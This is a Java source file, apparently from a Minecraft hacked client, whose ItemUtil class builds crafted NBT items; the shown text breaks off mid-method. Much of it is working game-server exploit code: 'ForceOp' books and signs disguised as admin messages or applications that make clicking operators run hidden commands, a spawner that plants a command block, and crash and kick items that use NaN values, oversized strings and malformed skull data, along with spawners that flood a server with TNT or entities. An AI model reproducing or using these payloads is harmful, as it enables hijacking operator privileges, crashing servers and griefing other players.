package me.bratwurst.news.newutils;

import net.minecraft.client.Minecraft;
import net.minecraft.init.Blocks;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.JsonToNBT;
import net.minecraft.nbt.NBTException;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagDouble;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.util.ResourceLocation;

public class ItemUtil {
    public static ItemStack getSpawnerFromFurnace(ItemStack itemStack) {
        ItemStack furnace = new ItemStack(Blocks.furnace);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound blockEntityTag = new NBTTagCompound();
        blockEntityTag.setShort("BurnTime", (short)0);
        blockEntityTag.setShort("CookTime", (short)0);
        blockEntityTag.setShort("CookTimeTotal", (short)200);
        blockEntityTag.setString("id", "Furnace");
        blockEntityTag.setString("Lock", "");
        NBTTagList items = new NBTTagList();
        NBTTagCompound item = new NBTTagCompound();
        item.setByte("Count", (byte)1);
        item.setShort("Damage", (short)itemStack.getItemDamage());
        item.setString("id", "minecraft:mob_spawner");
        item.setShort("Slot", (short)0);
        item.setTag("tag", itemStack.getTagCompound());
        items.appendTag(item);
        blockEntityTag.setTag("Items", items);
        base.setTag("BlockEntityTag", blockEntityTag);
        furnace.setTagCompound(base);
        return furnace;
    }

    public static ItemStack getCrashAnvil() {
        return new ItemStack(Blocks.anvil, 1, 3);
    }

    public static ItemStack getKillPotion() {
        ItemStack stack = ItemUtil.createSplashBase();
        NBTTagList effects = new NBTTagList();
        NBTTagCompound effect = new NBTTagCompound();
        effect.setInteger("Amplifier", 125);
        effect.setInteger("Duration", 2000);
        effect.setInteger("Id", 6);
        effects.appendTag(effect);
        stack.setTagInfo("CustomPotionEffects", effects);
        return stack;
    }

    public static ItemStack getForceOpBook(String command) {
        ItemStack stack = new ItemStack(Items.written_book);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagList list = new NBTTagList();
        list.appendTag(new NBTTagString("{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"%COMMAND%\"},\"hoverEvent\":{\"action\":\"show_text\",\"value\":{\"text\":\"%HOVERTEXT%\"}},\"text\":\"%TEXT%\"}".replace("%COMMAND%", command).replace("%HOVERTEXT%", "\u00a7[Click]").replace("%TEXT%", ItemUtil.getSpaces())));
        base.setTag("pages", list);
        base.setString("author", "\u00a74Ein Geist!");
        base.setByte("resolved", (byte)1);
        base.setString("title", "\u00a74Bewerbung");
        stack.setTagCompound(base);
        return stack;
    }

    public static ItemStack getPlayerSkull(String name) {
        ItemStack itemStack = new ItemStack(Items.skull, 1, 3);
        NBTTagCompound entityTag = new NBTTagCompound();
        entityTag.setString("SkullOwner", name);
        itemStack.setTagCompound(entityTag);
        return itemStack;
    }

    public static ItemStack getBlockRing(String block, int height) {
        ItemStack itm = new ItemStack(Blocks.mob_spawner);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound blockEntityTag = new NBTTagCompound();
        blockEntityTag.setString("EntityId", "ArmorStand");
        blockEntityTag.setInteger("SpawnCount", 50);
        blockEntityTag.setInteger("SpawnRange", 50);
        blockEntityTag.setInteger("RequiredPlayerRange", 50000);
        blockEntityTag.setInteger("MinSpawnDelay", 5);
        blockEntityTag.setInteger("MaxSpawnDelay", 5);
        blockEntityTag.setInteger("MaxNearbyEntities", 500);
        NBTTagCompound spawnData = new NBTTagCompound();
        spawnData.setInteger("Invulnerable", 1);
        NBTTagList equipment = new NBTTagList();
        spawnData.setInteger("Invisible", 1);
        spawnData.setTag("Equipment", equipment);
        NBTTagCompound Skull = new NBTTagCompound();
        Skull.setString("id", block);
        Skull.setInteger("Count", 1);
        NBTTagList pos = new NBTTagList();
        pos.appendTag(new NBTTagDouble(Minecraft.getMinecraft().thePlayer.posX));
        pos.appendTag(new NBTTagDouble(Minecraft.getMinecraft().thePlayer.posY + (double)height));
        pos.appendTag(new NBTTagDouble(Minecraft.getMinecraft().thePlayer.posZ));
        spawnData.setTag("Pos", pos);
        equipment.appendTag(Skull);
        blockEntityTag.setTag("SpawnData", spawnData);
        base.setTag("BlockEntityTag", blockEntityTag);
        itm.setTagCompound(base);
        return itm;
    }

    public static ItemStack getBlockWerfer(String block, double x, double y, double z) {
        ItemStack itm = new ItemStack(Blocks.mob_spawner);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound blockEntityTag = new NBTTagCompound();
        blockEntityTag.setString("EntityId", "FallingSand");
        blockEntityTag.setInteger("SpawnCount", 50);
        blockEntityTag.setInteger("SpawnRange", 50);
        blockEntityTag.setInteger("RequiredPlayerRange", 50000);
        blockEntityTag.setInteger("MinSpawnDelay", 5);
        blockEntityTag.setInteger("MaxSpawnDelay", 5);
        blockEntityTag.setInteger("MaxNearbyEntities", 500);
        NBTTagCompound spawnData = new NBTTagCompound();
        spawnData.setInteger("Invulnerable", 1);
        spawnData.setString("Tile", "minecraft:" + block);
        spawnData.setString("Block", "minecraft:" + block);
        spawnData.setInteger("Time", 1);
        NBTTagList Motion = new NBTTagList();
        Motion.appendTag(new NBTTagDouble(x));
        Motion.appendTag(new NBTTagDouble(y));
        Motion.appendTag(new NBTTagDouble(z));
        spawnData.setTag("Motion", Motion);
        blockEntityTag.setTag("SpawnData", spawnData);
        base.setTag("BlockEntityTag", blockEntityTag);
        itm.setTagCompound(base);
        return itm;
    }

    public static ItemStack getBombeCrashBlock() {
        ItemStack itm = new ItemStack(Blocks.mob_spawner, 1, 0);
        try {
            itm.setTagCompound(JsonToNBT.getTagFromJson("{BlockEntityTag:{SpawnCount:5000,MaxNearbyEntities:5000,SpawnRange:10,Delay:20,MinSpawnDelay:60,MaxSpawnDelay:120,RequiredPlayerRange:5000,EntityId:PrimedTnt,SpawnData:{CustomName:PENG,CustomNameVisible:1,Riding:{id:LavaSlime,Size:1}}}}"));
        }
        catch (NBTException e) {
            e.printStackTrace();
        }
        return itm;
    }

    public static ItemStack getTntEntity(String entity) {
        ItemStack itm = new ItemStack(Blocks.mob_spawner, 1, 0);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound BlockEntityTag = new NBTTagCompound();
        NBTTagCompound SpawnData = new NBTTagCompound();
        NBTTagCompound Riding = new NBTTagCompound();
        BlockEntityTag.setInteger("SpawnCount", 5000);
        BlockEntityTag.setInteger("MaxNearbyEntities", 6);
        BlockEntityTag.setInteger("SpawnRange", 3);
        BlockEntityTag.setInteger("Delay", 1);
        BlockEntityTag.setInteger("MinSpawnDelay", 1);
        BlockEntityTag.setInteger("MaxSpawnDelay", 1);
        BlockEntityTag.setInteger("RequiredPlayerRange", 6);
        BlockEntityTag.setString("EntityId", "PrimedTnt");
        SpawnData.setInteger("Fuse", 120);
        Riding.setString("id", entity);
        Riding.setString("CustomName", "\u00a7aTnt!!!");
        SpawnData.setTag("Riding", Riding);
        BlockEntityTag.setTag("SpawnData", SpawnData);
        base.setTag("BlockEntityTag", BlockEntityTag);
        base.setInteger("HideFlags", 63);
        itm.setTagCompound(base);
        itm.setStackDisplayName("\u00a7eAttentat");
        return itm;
    }

    public static ItemStack getBookPageExploit(int site, String command) {
        ItemStack itm = new ItemStack(Items.written_book);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound display = new NBTTagCompound();
        NBTTagList lore = new NBTTagList();
        lore.appendTag(new NBTTagString("Bitte lesen!"));
        display.setTag("Lore", lore);
        base.setString("author", "Admin");
        base.setByte("resolved", (byte)1);
        base.setString("title", "Bitte lesen!");
        NBTTagList pages = new NBTTagList();
        for (int i = 0; i < site; ++i) {
            pages.appendTag(new NBTTagString("{\"extra\":[\"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\",{\"clickEvent\":{\"action\":\"run_command\", \"value\":\"" + command + "\"}, \"text\":\"                                \"}], \"text\":\"\"}"));
            pages.appendTag(new NBTTagString("{\"extra\":[\"\n\n\n\n\n\n\n\n\n\n\n\n\n\",{\"clickEvent\":{\"action\":\"run_command\", \"value\":\"" + command + "\"}, \"text\":\"                                \"}], \"text\":\"\"}"));
        }
        base.setTag("pages", pages);
        itm.setTagCompound(base);
        return itm;
    }

    public static ItemStack getBugItem(String itemName) {
        ItemStack itm = new ItemStack(Item.itemRegistry.getObject(new ResourceLocation(itemName)));
        NBTTagCompound base = new NBTTagCompound();
        base.setByte("HideFlags", (byte)63);
        NBTTagList attributeModifiers = new NBTTagList();
        NBTTagCompound glitch = new NBTTagCompound();
        glitch.setDouble("Amount", Double.NaN);
        glitch.setString("AttributeName", "generic.movementSpeed");
        glitch.setString("Name", "GetRektM8");
        glitch.setInteger("Operation", 0);
        glitch.setString("Slot", "mainhand");
        glitch.setInteger("UUIDLeast", 1);
        glitch.setInteger("UUIDMost", 1);
        attributeModifiers.appendTag(glitch);
        base.setTag("AttributeModifiers", attributeModifiers);
        itm.setTagCompound(base);
        return itm;
    }

    public static ItemStack getBetaFlyPlayer() {
        ItemStack itm = new ItemStack(Blocks.mob_spawner);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound blockEntityTag = new NBTTagCompound();
        blockEntityTag.setString("EntityId", "ArmorStand");
        blockEntityTag.setInteger("SpawnCount", 50);
        blockEntityTag.setInteger("SpawnRange", 50);
        blockEntityTag.setInteger("RequiredPlayerRange", 50000);
        blockEntityTag.setInteger("MinSpawnDelay", 5);
        blockEntityTag.setInteger("MaxSpawnDelay", 5);
        blockEntityTag.setInteger("MaxNearbyEntities", 500);
        NBTTagCompound spawnData = new NBTTagCompound();
        spawnData.setInteger("Invulnerable", 1);
        spawnData.setString("CustomName", "test" + Minecraft.getMinecraft().getSession().getUsername());
        spawnData.setInteger("CustomNameVisible", 1);
        spawnData.setByte("ShowArms", (byte)1);
        spawnData.setByte("NoBasePlate", (byte)1);
        NBTTagCompound cowCompound = new NBTTagCompound();
        cowCompound.setString("id", "Bat");
        NBTTagList equipment = new NBTTagList();
        NBTTagCompound handItem = new NBTTagCompound();
        handItem.setString("id", "command_block");
        handItem.setByte("Count", (byte)1);
        NBTTagCompound boots = new NBTTagCompound();
        boots.setString("id", "diamond_boots");
        boots.setByte("Count", (byte)1);
        NBTTagCompound leggins = new NBTTagCompound();
        leggins.setString("id", "golden_leggings");
        leggins.setByte("Count", (byte)1);
        NBTTagCompound chestplate = new NBTTagCompound();
        chestplate.setString("id", "diamond_chestplate");
        chestplate.setByte("Count", (byte)1);
        NBTTagCompound Skull = new NBTTagCompound();
        Skull.setString("id", "skull");
        Skull.setByte("Count", (byte)1);
        Skull.setByte("Damage", (byte)3);
        NBTTagCompound tag = new NBTTagCompound();
        tag.setString("SkullOwner", Minecraft.getMinecraft().getSession().getUsername());
        Skull.setTag("tag", tag);
        equipment.appendTag(handItem);
        equipment.appendTag(boots);
        equipment.appendTag(leggins);
        equipment.appendTag(chestplate);
        equipment.appendTag(Skull);
        NBTTagCompound effect = new NBTTagCompound();
        effect.setInteger("Id", 14);
        effect.setInteger("Amplifier", 0);
        effect.setInteger("Duration", 20000000);
        effect.setByte("ShowParticles", (byte)0);
        NBTTagList activeEffects = new NBTTagList();
        activeEffects.appendTag(effect);
        cowCompound.setTag("ActiveEffects", activeEffects);
        spawnData.setTag("Riding", cowCompound);
        spawnData.setTag("Equipment", equipment);
        blockEntityTag.setTag("SpawnData", spawnData);
        base.setTag("BlockEntityTag", blockEntityTag);
        itm.setTagCompound(base);
        return itm;
    }

    public static ItemStack getForceOpSpawner(String command) {
        ItemStack itm = new ItemStack(Blocks.mob_spawner);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound blockEntityTag = new NBTTagCompound();
        blockEntityTag.setString("EntityId", "FallingSand");
        blockEntityTag.setInteger("SpawnCount", 1);
        blockEntityTag.setInteger("SpawnRange", 5);
        blockEntityTag.setInteger("RequiredPlayerRange", 100);
        blockEntityTag.setInteger("MinSpawnDelay", 20);
        blockEntityTag.setInteger("MaxSpawnDelay", 20);
        blockEntityTag.setInteger("MaxNearbyEntities", 1);
        NBTTagCompound spawnData = new NBTTagCompound();
        spawnData.setString("Tile", "minecraft:command_block");
        spawnData.setString("Block", "minecraft:command_block");
        spawnData.setInteger("Time", 1);
        NBTTagCompound tag = new NBTTagCompound();
        tag.setString("Command", command);
        spawnData.setTag("TileEntityData", tag);
        blockEntityTag.setTag("SpawnData", spawnData);
        base.setTag("BlockEntityTag", blockEntityTag);
        itm.setTagCompound(base);
        return itm;
    }

    public static ItemStack getCommandSign(String command, String text) {
        ItemStack itm = new ItemStack(Items.sign);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound blockEntityTag = new NBTTagCompound();
        blockEntityTag.setString("id", "Sign");
        blockEntityTag.setString("Text1", "{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + command + "\"},\"text\":\"" + text + "\"}");
        base.setTag("BlockEntityTag", blockEntityTag);
        itm.setTagCompound(base);
        return itm;
    }

    public static ItemStack getCrashBlock() {
        ItemStack itm = new ItemStack(Blocks.mob_spawner, 1, 0);
        try {
            itm.setTagCompound(JsonToNBT.getTagFromJson("{BlockEntityTag:{EntityId:FallingSand,SpawnData:{Block:%args%,Data:0,Time:1,DropItem:0,Riding:{id:Bat,Silent:1,ActiveEffects:[{Id:14,Amplifier:32,Duration:2147483647,ShowParticles:0b}]}},SpawnCount:500,SpawnRange:6,Delay:1}}"));
        }
        catch (NBTException e) {
            e.printStackTrace();
        }
        return itm;
    }

    public static ItemStack getCrashChest() {
        ItemStack itm = new ItemStack(Blocks.chest, 1, 0);
        try {
            itm.setTagCompound(JsonToNBT.getTagFromJson("{HideFlags:63b,BlockEntityTag:{Items:[0:{Slot:0b,id:\\\"minecraft:skull\\\",Count:64b,tag:{SkullOwner:{Id:\\\"0\\\"}}}]}}"));
        }
        catch (NBTException e) {
            e.printStackTrace();
        }
        return itm;
    }

    public static ItemStack getCreativeItemFunKicker() {
        ItemStack itm = new ItemStack(Item.getItemById(122));
        NBTTagCompound illegal = new NBTTagCompound();
        illegal.setDouble("adminkicker", Double.NaN);
        String hacked = "";
        for (int i = 0; i < 900; ++i) {
            hacked = hacked + "\u00a7c\u00a7l        ";
        }
        illegal.setString("z", hacked);
        itm.setTagCompound(illegal);
        return itm;
    }

    public static ItemStack getCreativeItemFunClear() {
        ItemStack itm2 = new ItemStack(Item.getItemById(122));
        NBTTagCompound illegal = new NBTTagCompound();
        illegal.setDouble("adminkicker", Double.NaN);
        String hacked = "";
        for (int i = 0; i < 1000; ++i) {
            hacked = hacked + "               ";
        }
        illegal.setString("z", hacked);
        itm2.setTagCompound(illegal);
        return itm2;
    }

    public static ItemStack getDestroyBlock(double x, double y, double z) {
        ItemStack itm = new ItemStack(Blocks.mob_spawner);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound blockEntityTag = new NBTTagCompound();
        blockEntityTag.setString("EntityId", "EnderDragon");
        blockEntityTag.setInteger("SpawnCount", 500);
        blockEntityTag.setInteger("SpawnRange", 500);
        blockEntityTag.setInteger("RequiredPlayerRange", 50000);
        blockEntityTag.setInteger("MinSpawnDelay", 5);
        blockEntityTag.setInteger("MaxSpawnDelay", 5);
        blockEntityTag.setInteger("MaxNearbyEntities", 500);
        NBTTagCompound spawnData = new NBTTagCompound();
        NBTTagCompound cowCompound = new NBTTagCompound();
        NBTTagList pos = new NBTTagList();
        pos.appendTag(new NBTTagDouble(x));
        pos.appendTag(new NBTTagDouble(y));
        pos.appendTag(new NBTTagDouble(z));
        cowCompound.setString("id", "Bat");
        spawnData.setTag("Pos", pos);
        NBTTagCompound effect = new NBTTagCompound();
        effect.setInteger("id", 14);
        effect.setInteger("Amplifier", 0);
        effect.setInteger("Duration", 2000000);
        effect.setByte("ShowParticles", (byte)0);
        NBTTagList activeEffects = new NBTTagList();
        activeEffects.appendTag(effect);
        cowCompound.setTag("ActiveEffects", activeEffects);
        spawnData.setTag("Riding", cowCompound);
        blockEntityTag.setTag("SpawnData", spawnData);
        base.setTag("BlockEntityTag", blockEntityTag);
        itm.setTagCompound(base);
        return itm;
    }

    public static ItemStack getEntityWerfer(String entity, double x, double y, double z) {
        ItemStack itm = new ItemStack(Blocks.mob_spawner);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound blockEntityTag = new NBTTagCompound();
        blockEntityTag.setString("EntityId", entity);
        blockEntityTag.setInteger("SpawnCount", 50);
        blockEntityTag.setInteger("SpawnRange", 50);
        blockEntityTag.setInteger("RequiredPlayerRange", 50000);
        blockEntityTag.setInteger("MinSpawnDelay", 5);
        blockEntityTag.setInteger("MaxSpawnDelay", 5);
        blockEntityTag.setInteger("MaxNearbyEntities", 500);
        NBTTagCompound spawnData = new NBTTagCompound();
        spawnData.setInteger("Invulnerable", 1);
        spawnData.setByte("shake", (byte)0);
        NBTTagList Motion = new NBTTagList();
        Motion.appendTag(new NBTTagDouble(x));
        Motion.appendTag(new NBTTagDouble(y));
        Motion.appendTag(new NBTTagDouble(z));
        spawnData.setTag("Motion", Motion);
        blockEntityTag.setTag("SpawnData", spawnData);
        base.setTag("BlockEntityTag", blockEntityTag);
        itm.setTagCompound(base);
        return itm;
    }

    public static ItemStack getFlyBlocks(String block) {
        ItemStack itm = new ItemStack(Blocks.mob_spawner);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound blockEntityTag = new NBTTagCompound();
        blockEntityTag.setString("EntityId", "FallingSand");
        blockEntityTag.setInteger("SpawnCount", 50);
        blockEntityTag.setInteger("SpawnRange", 50);
        blockEntityTag.setInteger("RequiredPlayerRange", 50000);
        blockEntityTag.setInteger("MinSpawnDelay", 5);
        blockEntityTag.setInteger("MaxSpawnDelay", 5);
        blockEntityTag.setInteger("MaxNearbyEntities", 500);
        NBTTagCompound spawnData = new NBTTagCompound();
        spawnData.setInteger("Invulnerable", 1);
        spawnData.setString("Tile", "minecraft:" + block);
        spawnData.setString("Block", "minecraft:" + block);
        spawnData.setInteger("Time", 1);
        spawnData.setInteger("Invisible", 1);
        NBTTagCompound cowCompound = new NBTTagCompound();
        cowCompound.setString("id", "Bat");
        NBTTagCompound effect = new NBTTagCompound();
        effect.setInteger("Id", 14);
        effect.setInteger("Amplifier", 0);
        effect.setInteger("Duration", 20000000);
        effect.setByte("ShowParticles", (byte)0);
        NBTTagList activeEffects = new NBTTagList();
        activeEffects.appendTag(effect);
        cowCompound.setTag("ActiveEffects", activeEffects);
        spawnData.setTag("Riding", cowCompound);
        blockEntityTag.setTag("SpawnData", spawnData);
        base.setTag("BlockEntityTag", blockEntityTag);
        itm.setTagCompound(base);
        return itm;
    }

    public static ItemStack getFlyEntitys(String entity) {
        ItemStack itm = new ItemStack(Blocks.mob_spawner);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound blockEntityTag = new NBTTagCompound();
        blockEntityTag.setString("EntityId", entity);
        blockEntityTag.setInteger("SpawnCount", 50);
        blockEntityTag.setInteger("SpawnRange", 50);
        blockEntityTag.setInteger("RequiredPlayerRange", 50000);
        blockEntityTag.setInteger("MinSpawnDelay", 5);
        blockEntityTag.setInteger("MaxSpawnDelay", 5);
        blockEntityTag.setInteger("MaxNearbyEntities", 500);
        NBTTagCompound spawnData = new NBTTagCompound();
        spawnData.setInteger("Invulnerable", 1);
        NBTTagCompound cowCompound = new NBTTagCompound();
        cowCompound.setString("id", "Bat");
        NBTTagCompound effect = new NBTTagCompound();
        effect.setInteger("Id", 14);
        effect.setInteger("Amplifier", 0);
        effect.setInteger("Duration", 20000000);
        effect.setByte("ShowParticles", (byte)0);
        NBTTagList activeEffects = new NBTTagList();
        activeEffects.appendTag(effect);
        cowCompound.setTag("ActiveEffects", activeEffects);
        spawnData.setTag("Riding", cowCompound);
        blockEntityTag.setTag("SpawnData", spawnData);
        blockEntityTag.setInteger("Invisible", 1);
        base.setTag("BlockEntityTag", blockEntityTag);
        itm.setTagCompound(base);
        return itm;
    }

    public static ItemStack getFlyFish() {
        ItemStack itm = new ItemStack(Blocks.mob_spawner, 1, 0);
        try {
            itm.setTagCompound(JsonToNBT.getTagFromJson("{BlockEntityTag:{SpawnCount:10,SpawnRange:6,Delay:1,EntityId:ArmorStand,SpawnData:{Invisible:1b,Invulnerable:1b,Small:1b,Equipment:[{},{},{},{},{id:\"skull\",Count:1b,Damage:3b,tag:{SkullOwner:{Id:\"509fb1f6-f360-44b6-a35e-f75f1a644248\",Properties:{textures:[{Value:\"eyJ0ZXh0dXJlcyI6eyJTS0lOIjp7InVybCI6Imh0dHA6Ly90ZXh0dXJlcy5taW5lY3JhZnQubmV0L3RleHR1cmUvNWQ3MzFlMGU4YmYwNjI5NjVlODkwNGU5ZWZjMWZkZTMxM2NmODRkNTMxNDg3YzI2Njg2NDk5MGJkY2NkN2I1NCJ9fX0=\"}]}}}}],Riding:{id:Bat,Silent:1,ActiveEffects:[{Id:14,Amplifier:32,Duration:2147483647,ShowParticles:0b}]}}}}"));
        }
        catch (NBTException e) {
            e.printStackTrace();
        }
        return itm;
    }

    public static ItemStack getFlyPlayers(String name) {
        ItemStack itm = new ItemStack(Blocks.mob_spawner);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound blockEntityTag = new NBTTagCompound();
        blockEntityTag.setString("EntityId", "ArmorStand");
        blockEntityTag.setInteger("SpawnCount", 50);
        blockEntityTag.setInteger("SpawnRange", 50);
        blockEntityTag.setInteger("RequiredPlayerRange", 50000);
        blockEntityTag.setInteger("MinSpawnDelay", 5);
        blockEntityTag.setInteger("MaxSpawnDelay", 5);
        blockEntityTag.setInteger("MaxNearbyEntities", 500);
        NBTTagCompound spawnData = new NBTTagCompound();
        spawnData.setInteger("Invulnerable", 1);
        spawnData.setString("CustomName", name);
        spawnData.setInteger("CustomNameVisible", 1);
        spawnData.setByte("ShowArms", (byte)1);
        spawnData.setByte("NoBasePlate", (byte)1);
        NBTTagCompound cowCompound = new NBTTagCompound();
        cowCompound.setString("id", "Bat");
        NBTTagList equipment = new NBTTagList();
        NBTTagCompound handItem = new NBTTagCompound();
        handItem.setString("id", "command_block");
        handItem.setByte("Count", (byte)1);
        NBTTagCompound boots = new NBTTagCompound();
        boots.setString("id", "diamond_boots");
        boots.setByte("Count", (byte)1);
        NBTTagCompound leggins = new NBTTagCompound();
        leggins.setString("id", "golden_leggings");
        leggins.setByte("Count", (byte)1);
        NBTTagCompound chestplate = new NBTTagCompound();
        chestplate.setString("id", "diamond_chestplate");
        chestplate.setByte("Count", (byte)1);
        NBTTagCompound Skull = new NBTTagCompound();
        Skull.setString("id", "skull");
        Skull.setByte("Count", (byte)1);
        Skull.setByte("Damage", (byte)3);
        NBTTagCompound tag = new NBTTagCompound();
        tag.setString("SkullOwner", name);
        Skull.setTag("tag", tag);
        equipment.appendTag(handItem);
        equipment.appendTag(boots);
        equipment.appendTag(leggins);
        equipment.appendTag(chestplate);
        equipment.appendTag(Skull);
        NBTTagCompound effect = new NBTTagCompound();
        effect.setInteger("Id", 14);
        effect.setInteger("Amplifier", 0);
        effect.setInteger("Duration", 20000000);
        effect.setByte("ShowParticles", (byte)0);
        NBTTagList activeEffects = new NBTTagList();
        activeEffects.appendTag(effect);
        cowCompound.setTag("ActiveEffects", activeEffects);
        spawnData.setTag("Riding", cowCompound);
        spawnData.setTag("Equipment", equipment);
        blockEntityTag.setTag("SpawnData", spawnData);
        base.setTag("BlockEntityTag", blockEntityTag);
        itm.setTagCompound(base);
        return itm;
    }

    public static ItemStack getFlyItems(String item) {
        ItemStack itm = new ItemStack(Blocks.mob_spawner);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound blockEntityTag = new NBTTagCompound();
        blockEntityTag.setString("EntityId", "ArmorStand");
        blockEntityTag.setInteger("SpawnCount", 50);
        blockEntityTag.setInteger("SpawnRange", 50);
        blockEntityTag.setInteger("RequiredPlayerRange", 50000);
        blockEntityTag.setInteger("MinSpawnDelay", 5);
        blockEntityTag.setInteger("MaxSpawnDelay", 5);
        blockEntityTag.setInteger("MaxNearbyEntities", 500);
        NBTTagCompound spawnData = new NBTTagCompound();
        spawnData.setInteger("Invulnerable", 1);
        NBTTagList equipment = new NBTTagList();
        spawnData.setInteger("Invisible", 1);
        spawnData.setTag("Equipment", equipment);
        NBTTagCompound Skull = new NBTTagCompound();
        Skull.setString("id", item);
        Skull.setInteger("Count", 1);
        NBTTagCompound cowCompound = new NBTTagCompound();
        equipment.appendTag(Skull);
        cowCompound.setString("id", "Bat");
        NBTTagCompound effect = new NBTTagCompound();
        effect.setInteger("Id", 14);
        effect.setInteger("Amplifier", 0);
        effect.setInteger("Duration", 20000000);
        effect.setByte("ShowParticles", (byte)0);
        NBTTagList activeEffects = new NBTTagList();
        activeEffects.appendTag(effect);
        cowCompound.setTag("ActiveEffects", activeEffects);
        spawnData.setTag("Riding", cowCompound);
        blockEntityTag.setTag("SpawnData", spawnData);
        base.setTag("BlockEntityTag", blockEntityTag);
        itm.setTagCompound(base);
        return itm;
    }

    public static ItemStack getFunnyGiant() {
        ItemStack itm = new ItemStack(Blocks.mob_spawner, 1, 0);
        try {
            itm.setTagCompound(JsonToNBT.getTagFromJson("{BlockEntityTag:{SpawnCount:4,SpawnRange:1,Delay:5,EntityId:Giant,SpawnData:{Equipment:[{id:torch,Count:1,tag:{display:{Name:\"PENIS\"}}},{id:leather_boots,Count:1},{id:leather_leggings,Count:1},{id:leather_chestplate,Count:1},{id:skull,Damage:4,Count:1}],Riding:{id:\"Bat\",ActiveEffects:[{Id:14,Amplifier:33,Duration:62462462460,ShowParticles:0b}]}}}}"));
        }
        catch (NBTException e) {
            e.printStackTrace();
        }
        return itm;
    }

    public static ItemStack getGiant() {
        ItemStack itm = new ItemStack(Blocks.mob_spawner, 1, 0);
        try {
            itm.setTagCompound(JsonToNBT.getTagFromJson("{BlockEntityTag:{EntityId:Giant,SpawnData:{Equipment:[{id:torch,Count:1},{},{},{},{}]}}}"));
        }
        catch (NBTException e) {
            e.printStackTrace();
        }
        return itm;
    }

    public static ItemStack getPennisDestroyer() {
        ItemStack itm = new ItemStack(Blocks.mob_spawner, 1, 0);
        try {
            itm.setTagCompound(JsonToNBT.getTagFromJson("{BlockEntityTag:{EntityId:PrimedTnt,SpawnData:{CustomName:\"\u00a74\u00a7lPenis\",CustomNameVisible:1,Motion:[0.0,1.0,0.0],Fuse:1,Riding:{id:Silverfish,NoAI:1b,Silent:1,ActiveEffects:[{Id:14,Amplifier:0,Duration:2147483647,ShowParticles:0b}]}},SpawnCount:500,Delay:1}}"));
        }
        catch (NBTException e) {
            e.printStackTrace();
        }
        return itm;
    }

    public static ItemStack getPlanetSpawner(int radius) throws NBTException {
        ItemStack itm = new ItemStack(Blocks.mob_spawner, 1, 0);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound BlockEntityTag = new NBTTagCompound();
        NBTTagCompound SpawnData = new NBTTagCompound();
        NBTTagList equipment = new NBTTagList();
        BlockEntityTag.setInteger("SpawnCount", 40);
        BlockEntityTag.setInteger("SpawnRange", radius);
        BlockEntityTag.setInteger("RequiredPlayerRange", 6);
        BlockEntityTag.setInteger("MaxNearbyEntities", 10);
        BlockEntityTag.setInteger("MinSpawnDelay", 2);
        BlockEntityTag.setInteger("MaxSpawnDelay", 4);
        BlockEntityTag.setString("EntityId", "ArmorStand");
        SpawnData.setInteger("Invisible", 1);
        SpawnData.setInteger("Invulnerable", 1);
        SpawnData.setInteger("NoBasePlate", 1);
        SpawnData.setInteger("NoGravity", 1);
        equipment.appendTag(JsonToNBT.getTagFromJson("{}"));
        equipment.appendTag(JsonToNBT.getTagFromJson("{}"));
        equipment.appendTag(JsonToNBT.getTagFromJson("{}"));
        equipment.appendTag(JsonToNBT.getTagFromJson("{}"));
        equipment.appendTag(JsonToNBT.getTagFromJson("{id:\"skull\",Count:1b,Damage:3b,tag:{SkullOwner:{Id:\"0ceac85e-159d-4f9d-a1c2-c8acde792f23\",Properties:{textures:[{Value:\"eyJ0ZXh0dXJlcyI6eyJTS0lOIjp7InVybCI6Imh0dHA6Ly90ZXh0dXJlcy5taW5lY3JhZnQubmV0L3RleHR1cmUvYjFkZDRmZTRhNDI5YWJkNjY1ZGZkYjNlMjEzMjFkNmVmYTZhNmI1ZTdiOTU2ZGI5YzVkNTljOWVmYWIyNSJ9fX0=\"}]}}}}"));
        SpawnData.setTag("Equipment", equipment);
        BlockEntityTag.setTag("SpawnData", SpawnData);
        base.setTag("BlockEntityTag", BlockEntityTag);
        itm.setTagCompound(base);
        return itm;
    }

    public static ItemStack getPoopSpawner(Integer Count, Integer Delay, Integer Range2) throws NBTException {
        ItemStack itm = new ItemStack(Blocks.mob_spawner, 1, 0);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound BlockEntityTag = new NBTTagCompound();
        NBTTagCompound SpawnData = new NBTTagCompound();
        NBTTagList Equipment = new NBTTagList();
        BlockEntityTag.setInteger("SpawnCount", Count);
        BlockEntityTag.setInteger("SpawnRange", Range2);
        BlockEntityTag.setInteger("Delay", Delay);
        BlockEntityTag.setString("EntityId", "ArmorStand");
        Equipment.appendTag(JsonToNBT.getTagFromJson("{}"));
        Equipment.appendTag(JsonToNBT.getTagFromJson("{}"));
        Equipment.appendTag(JsonToNBT.getTagFromJson("{}"));
        Equipment.appendTag(JsonToNBT.getTagFromJson("{}"));
